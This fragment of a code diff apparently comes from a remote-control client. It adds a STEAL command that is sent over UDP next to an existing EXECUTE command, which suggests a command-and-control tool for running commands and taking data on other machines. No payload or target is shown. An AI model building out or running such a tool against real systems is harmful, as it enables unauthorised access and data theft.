@@ -221,6 +221,10 @@ if __name__ == "__main__":
                 send_udp(data)
                 receive_single_response()
                 continue
+            if argv[0] == STEAL:
+                send_udp(data)
+                receive_single_response()
+                continue
         if argv[0] == EXECUTE:
             data = argv[0] + " " + arg_list_to_string(argv[1:])
             send_udp(data)
